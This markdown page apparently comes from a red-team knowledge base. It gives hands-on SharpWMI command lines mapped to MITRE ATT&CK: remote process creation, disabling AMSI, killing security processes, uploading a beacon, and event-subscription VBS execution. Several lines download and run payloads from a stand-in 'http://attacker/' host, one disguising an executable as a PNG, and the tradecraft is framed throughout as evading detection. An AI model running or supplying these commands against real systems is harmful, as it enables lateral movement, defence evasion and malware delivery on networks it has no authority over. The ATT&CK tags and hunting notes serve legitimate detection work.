# SharpWMI — Hands-On Use Cases

Every command below is taken directly from — or is a straightforward composition of — the usage/examples blocks in [`GhostPack/SharpWMI`](https://github.com/GhostPack/SharpWMI)'s `README.md`. MITRE ATT&CK ID(s) are tagged per scenario since the technique mix shifts depending on which of SharpWMI's three families (query, method-call, event-subscription — see `01 - Overview.md`) a given action belongs to.

## Contents
- [Local WMI Query Enumeration](#local-wmi-query-enumeration)
- [Remote WMI Query Enumeration Across Multiple Hosts](#remote-wmi-query-enumeration-across-multiple-hosts)
- [Remote Logged-On User Enumeration](#remote-logged-on-user-enumeration)
- [Baseline Remote Process Creation](#baseline-remote-process-creation)
- [Remote Process Creation with Output Capture](#remote-process-creation-with-output-capture)
- [Remote Process Creation with AMSI Disabled](#remote-process-creation-with-amsi-disabled)
- [Explicit Alternate Credentials](#explicit-alternate-credentials)
- [VBS Execution via WMI Event Subscription — Preset Command](#vbs-execution-via-wmi-event-subscription--preset-command)
- [VBS Execution — Download and Run PowerShell via Stdin](#vbs-execution--download-and-run-powershell-via-stdin)
- [VBS Execution — Download and Execute a Binary](#vbs-execution--download-and-execute-a-binary)
- [VBS Execution — Local File, Literal, and Base64 Script](#vbs-execution--local-file-literal-and-base64-script)
- [File Upload via WMI](#file-upload-via-wmi)
- [Remote Firewall Enumeration](#remote-firewall-enumeration)
- [Remote Process Listing and Termination](#remote-process-listing-and-termination)
- [Remote Environment Variable Manipulation](#remote-environment-variable-manipulation)
- [Remote MSI Installation](#remote-msi-installation)
- [Fleet-Wide Use](#fleet-wide-use)
- [In-Memory Execution via a C2 Loader](#in-memory-execution-via-a-c2-loader)
- [Choosing SharpWMI Over wmiexec.py or wmic.exe](#choosing-sharpwmi-over-wmiexecpy-or-wmicexe)

---

## Local WMI Query Enumeration

**MITRE ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation), [T1518](https://attack.mitre.org/techniques/T1518/)/[T1007](https://attack.mitre.org/techniques/T1007/)-class discovery depending on the class queried

```
SharpWMI.exe action=query query="select * from win32_process"
```

No `computername=` given — every action defaults to the local host with no network hop at all (per `01`). This is the baseline recon invocation: enumerate any WMI class in-process, entirely local.

```
SharpWMI.exe action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"
```

`namespace=` overrides the `root\cimv2` default — here, pulling installed AV product info from the Security Center namespace, a common pre-operation defensive-tooling check.

## Remote WMI Query Enumeration Across Multiple Hosts

**MITRE ATT&CK:** T1047 · [T1018](https://attack.mitre.org/techniques/T1018/) (Remote System Discovery)

```
SharpWMI.exe action=query computername=primary.testlab.local query="select * from win32_service"

SharpWMI.exe action=query computername=primary,secondary query="select * from win32_process"
```

`computername=` accepts a comma-separated list, so a single invocation queries multiple hosts in one shot — the same DCOM/RPC channel documented in `01`, opened once per target.

## Remote Logged-On User Enumeration

**MITRE ATT&CK:** [T1033](https://attack.mitre.org/techniques/T1033/) (System Owner/User Discovery) · T1047

```
SharpWMI.exe action=loggedon computername=primary.testlab.local
```

A dedicated action distinct from a hand-rolled `query=`, useful for quickly identifying who's logged into a target before deciding whether to move laterally there.

## Baseline Remote Process Creation

**MITRE ATT&CK:** T1047 · [T1021.003](https://attack.mitre.org/techniques/T1021/003/) (Remote Services: Distributed Component Object Model) · [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

```
SharpWMI.exe action=exec computername=primary.testlab.local command="powershell.exe -enc ZQBj..."
```

The same `Win32_Process.Create()` primitive as `wmiexec.py`/`wmic.exe process call create` — `WmiPrvSE.exe` on the target spawns the given command as a direct child, running as the authenticating user, not SYSTEM. No output is returned to the operator without `result=true` (below).

## Remote Process Creation with Output Capture

**MITRE ATT&CK:** T1047 · T1021.003

```
SharpWMI.exe action=exec computername=primary.testlab.local command="whoami" result=true amsi=disable
```

The distinguishing SharpWMI capability from `01`'s red-flag callout: `result=true` retrieves the command's console output by stashing it in a property of an ad hoc WMI object instance and reading it back over the **same WMI connection** — no SMB share write, no `__<timestamp>`-style output file, unlike `wmiexec.py`'s loopback-SMB relay. An operator who specifically wants command output back without leaving any filesystem output-relay artifact on the target reaches for this over `wmiexec.py`'s default (output-enabled) mode.

## Remote Process Creation with AMSI Disabled

**MITRE ATT&CK:** [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) · T1047

```
SharpWMI.exe action=exec computername=primary.testlab.local command="powershell.exe -enc ZQBj..." amsi=disable
```

`amsi=disable` — credited in the README's Authors table as code "taken from `SharpMove`" — disables AMSI on the target before the command runs, relevant specifically when the command is itself a PowerShell payload that would otherwise be subject to AMSI script-content scanning.

## Explicit Alternate Credentials

**MITRE ATT&CK:** [T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts) · T1047

```
SharpWMI.exe action=executevbs computername=primary.testlab.local username="TESTLAB\harmj0y" password="Password123!"
```

Any remote action accepts `username=`/`password=` per the README's note: *"Any remote function also takes an optional 'username=DOMAIN\user' 'password=Password123!'."* Without them, the call rides the calling process's current token instead.

## VBS Execution via WMI Event Subscription — Preset Command

**MITRE ATT&CK:** T1047 primary. This action mechanically rides the same `__EventFilter`/`__EventConsumer`/`__FilterToConsumerBinding` primitives MITRE catalogs under [T1546.003](https://attack.mitre.org/techniques/T1546/003/) (Event Triggered Execution: WMI Event Subscription) — but SharpWMI's own `trigger=`/`timeout=` framing positions this as a one-shot, self-cleaning execution technique rather than an explicit persistence installer (see `01`'s accuracy note). Tag T1546.003 as well only if a surviving triad is confirmed on the target after the run completes.

```
SharpWMI.exe action=executevbs computername=primary.testlab.local command="notepad.exe" eventname="MyLittleEvent" amsi=disable
```

Bypasses `Win32_Process.Create()` entirely — registers a transient `__EventFilter`/`ActiveScriptEventConsumer`/`__FilterToConsumerBinding` triad named via `eventname=`, which fires the preset-command VBS wrapper (script-specification method A, per `01`) after the default trigger delay. The resulting process tree runs through `scrcons.exe`, not `WmiPrvSE.exe` directly — see `04 - Target Evidence.md`.

## VBS Execution — Download and Run PowerShell via Stdin

**MITRE ATT&CK:** T1047 · [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (PowerShell) · [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```
SharpWMI.exe action=executevbs computername=primary.testlab.local url="http://attacker/myscript.ps1"
```

Script-specification method B — the VBS payload itself downloads a PowerShell script from the given URL and feeds it to `powershell.exe` via stdin, so the target never touches an on-disk `.ps1` file.

## VBS Execution — Download and Execute a Binary

**MITRE ATT&CK:** T1047 · T1105

```
# Download a binary and run it directly (method C)
SharpWMI.exe action=executevbs computername=primary.testlab.local url="http://attacker/foo.png,%TEMP%\bar.exe"

# Download a binary, then execute a separate, arbitrary follow-on command (method D)
SharpWMI.exe action=executevbs computername=primary.testlab.local url="http://attacker/foo.png,%TEMP%\bar.exe" command="%TEMP%\bar.exe -some -parameters"
```

`url="SOURCE_URL,TARGET_PATH"` — note the disguised extension (`.png` masking an executable) in the README's own example, a staging habit worth flagging on its own in any hunt for this pattern.

## VBS Execution — Local File, Literal, and Base64 Script

**MITRE ATT&CK:** T1047 · [T1027](https://attack.mitre.org/techniques/T1027/) (Obfuscated Files or Information) for the base64 variants

```
# From a local .vbs file (method E)
SharpWMI.exe action=executevbs computername=primary.testlab.local script="myscript.vbs"

# Literal inline VBS (method F)
SharpWMI.exe action=executevbs computername=primary.testlab.local script="CreateObject(\"WScript.Shell\").Run(\"notepad.exe\")"

# Base64-encoded VBS given literally (method G)
SharpWMI.exe action=executevbs computername=primary.testlab.local scriptb64="Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIi[...]"

# Base64-encoded VBS read from a local file (method H)
SharpWMI.exe action=executevbs computername=primary.testlab.local scriptb64="myscript.vbs.b64"

# Additional timing control: fire after 5 seconds, wait up to 10 for completion
SharpWMI.exe action=executevbs computername=primary.testlab.local script="myscript.vbs" trigger=5 timeout=10
```

All four variants register the identical subscription mechanism — only the `ScriptText` property content differs. `trigger=`/`timeout=` are available on any `executevbs` invocation, not just this one.

## File Upload via WMI

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```
SharpWMI.exe action=upload computername=primary.testlab.local source="beacon.exe" dest="C:\Windows\temp\foo.exe" amsi=disable
```

A file-transfer path that doesn't touch SMB/`ADMIN$` the way `wmiexec.py`'s `lput` or a manual `copy` to a UNC path would — the README doesn't detail the exact underlying WMI transport, but it plausibly rides the same ad hoc WMI-object channel `result=true` uses (see `01`'s open question). Useful specifically when SMB share access to the target is restricted or monitored but WMI/DCOM is not.

## Remote Firewall Enumeration

**MITRE ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001/) (Software Discovery: Security Software Discovery)

```
SharpWMI.exe action=firewall computername=primary.testlab.local
```

Pulls the target's firewall rule set over WMI — pre-lateral-movement recon to confirm what ports/programs are already permitted before attempting a noisier connection.

## Remote Process Listing and Termination

**MITRE ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057/) (Process Discovery) for `ps`; no single dedicated ATT&CK ID exists for generic process termination — if the targeted process is a security product, tag [T1562.001](https://attack.mitre.org/techniques/T1562/001/) instead

```
SharpWMI.exe action=ps computername=primary.testlab.local

SharpWMI.exe action=terminate computername=primary.testlab.local process=explorer
```

`terminate` kills the **first process matching** the given PID or name — useful both for basic process discovery before deciding on an execution target, and for a defense-evasion step against a named security-tool process.

## Remote Environment Variable Manipulation

**MITRE ATT&CK:** No precise dedicated ATT&CK sub-technique for WMI-based environment-variable read/write; scope this generically under T1047 unless a specific downstream technique (e.g. altering a variable a scheduled task or service depends on) applies

```
SharpWMI.exe action=getenv name=PATH computername=primary.testlab.local

SharpWMI.exe action=setenv name=FOO value="BAR" computername=primary.testlab.local

SharpWMI.exe action=delenv name=FOO computername=primary.testlab.local
```

`getenv` with no `name=` returns every environment variable on the target. `setenv`/`delenv` are a genuinely unusual capability among the tools built in this repo so far — remote, WMI-based environment tampering with no equivalent in `wmiexec.py` or plain `wmic.exe`.

## Remote MSI Installation

**MITRE ATT&CK:** Dependent on the unconfirmed mechanism flagged in `01` — if `install` shells out to `msiexec.exe` via `Win32_Process.Create()`, tag [T1218.007](https://attack.mitre.org/techniques/T1218/007/) (System Binary Proxy Execution: Msiexec); if it instead calls `Win32_Product.Install()` directly, no LOLBin-proxy-execution ID applies, since `msiexec.exe` is never separately invoked

```
SharpWMI.exe action=install computername=primary.testlab.local path="C:\temp\installer.msi"
```

The tool's final feature addition (per `01`'s history) — remote MSI deployment entirely through WMI, no separate file-copy-then-execute sequence required from the operator.

## Fleet-Wide Use

**MITRE ATT&CK:** T1047 · T1021.003 — scale is the only material difference from the baseline

```
for /f %h in (targets.txt) do SharpWMI.exe action=exec computername=%h command="whoami" result=true amsi=disable
```

`computername=`'s native comma-separated list handles a modest number of hosts in one process invocation; a wrapping loop (as above) or a comma-joined `targets.txt` read handles a larger sweep. Because every remote call still opens its own DCOM/RPC connection per target, the fleet-level signal is the same "burst of DCOM authentications + `WmiPrvSE.exe` spawns across many hosts in a tight window" already documented for `wmiexec.py`'s fleet-wide use.

## In-Memory Execution via a C2 Loader

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection) for the hosting mechanism; the action run inside carries whatever ID is listed above for that action

```
execute-assembly C:\Tools\SharpWMI.exe action=exec computername=primary.testlab.local command="whoami" result=true
```

Same reflective-.NET-assembly loading pattern already documented for `Rubeus/`, `Seatbelt/`, and `SharpUp/` — Cobalt Strike's `execute-assembly`, Covenant's equivalent, or Sliver's `execute-assembly` all host a CLR inside an existing beacon/implant process and invoke `SharpWMI.Program.Main()` directly, with no `SharpWMI.exe` ever touching disk on the operator's own host. Because SharpWMI targets .NET Framework 3.5 (same generation as `SharpUp`, older than `Rubeus`/`Seatbelt`'s 4.0+/4.8 range), whether AMSI's CLR-level hook applies depends on the **loader's own hosted CLR version**, not SharpWMI's declared target framework — see `03 - Source Evidence.md`.

## Choosing SharpWMI Over wmiexec.py or wmic.exe

An operator reaches for SharpWMI specifically when one of its non-overlapping capabilities matters more than the convenience of an already-available tool:

- **Output capture without a filesystem artifact.** `wmiexec.py`'s default output-relay mode writes a transient `__<timestamp>` file to an admin share; `wmic.exe` has no built-in output-relay mechanism at all for `process call create`. SharpWMI's `result=true` retrieves output through a pure WMI-object channel — no share write either way.
- **VBS execution via WMI event subscription.** Neither `wmiexec.py` nor `wmic.exe`'s standard `process call create`/`SquiblyTwo` paths offer this — it's a SharpWMI-specific capability that produces a `scrcons.exe`-hosted process tree instead of a `WmiPrvSE.exe`-direct-child one, a genuinely different evasion profile against detections tuned for the other two tools.
- **Native WMI file upload and environment-variable manipulation** — neither is a first-class feature of `wmiexec.py` (its `lput`/`lget` ride SMB, not WMI) or `wmic.exe`.
- **A single compiled .NET binary reflectively loadable via `execute-assembly`** — relevant when the operator's tradecraft already standardizes on C#/.NET tooling delivered in-memory through an existing C2 channel, rather than needing a separate Python interpreter (`wmiexec.py`) or relying on a LOLBin that's increasingly monitored/deprecated (`wmic.exe`, per `LOLBins/wmic/01 - Overview.md`'s deprecation-timeline finding).

Conversely, an operator without a .NET-hosting C2 channel, or who specifically wants to avoid dropping/loading a custom-compiled offensive .NET assembly at all, still reaches for `wmic.exe` (already on the box) or `wmiexec.py` (no target-side footprint whatsoever beyond the WMI/DCOM call itself).
